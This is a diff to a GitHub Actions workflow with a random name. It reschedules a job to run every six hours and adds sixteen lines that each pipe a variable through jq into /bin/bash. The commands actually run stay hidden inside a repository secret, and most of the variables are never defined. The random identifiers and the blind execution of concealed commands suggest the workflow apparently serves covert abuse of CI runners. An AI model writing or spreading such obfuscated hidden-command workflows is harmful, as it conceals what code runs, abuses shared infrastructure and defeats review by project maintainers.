@@ -2,7 +2,7 @@ name: alkaliconclusion
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 3/6 * * *'
+    - cron: '44 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: alkaliconclusion
         env:
-          vx54: ${{ secrets.vx54 }}
+          dsqki3: ${{ secrets.dsqki3 }}
         run: |
-          echo $vx54 | jq -r .rvua4 | /bin/bash
-          echo $srj71987 | jq -r .pjg82 | /bin/bash
-          echo $ukvgh910 | jq -r .uvzg03 | /bin/bash
-          echo $inkyo6 | jq -r .kdk81 | /bin/bash
-          echo $uxd85548 | jq -r .nnaz93 | /bin/bash
+          echo $dsqki3 | jq -r .d71 | /bin/bash
+          echo $cew25579 | jq -r .hjo12470 | /bin/bash
+          echo $kfc177 | jq -r .yxdh813 | /bin/bash
+          echo $j42510 | jq -r .ycnqo684 | /bin/bash
+          echo $tk92 | jq -r .xrugb52598 | /bin/bash
+          echo $pxes39 | jq -r .k10 | /bin/bash
+          echo $vgwt43855 | jq -r .z86 | /bin/bash
+          echo $jpoby66948 | jq -r .gn4 | /bin/bash
+          echo $khh656 | jq -r .mrjxh16 | /bin/bash
+          echo $f96 | jq -r .wnqkk25074 | /bin/bash
+          echo $lpocd3370 | jq -r .gdtow0157 | /bin/bash
+          echo $juico3 | jq -r .myng6 | /bin/bash
+          echo $ruu08146 | jq -r .yozue939 | /bin/bash
+          echo $bd0915 | jq -r .xmoz4048 | /bin/bash
+          echo $xi7701 | jq -r .cctr64 | /bin/bash
+          echo $rv8 | jq -r .sutvk0 | /bin/bash
 
